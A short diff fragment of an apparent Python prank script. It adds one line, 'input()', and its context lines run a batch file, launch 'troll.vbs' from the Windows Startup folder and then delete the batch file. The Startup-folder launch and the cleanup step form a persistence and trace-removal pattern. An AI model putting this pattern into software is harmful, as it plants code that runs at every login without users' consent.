@@ -18,6 +18,7 @@ os.system("AKAKKAKAKAK.bat")
 os.system("timeout /t 1 > nul")
 os.system("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\troll.vbs")
 os.system("del AKAKKAKAKAK.bat")
+input()
 
 
 
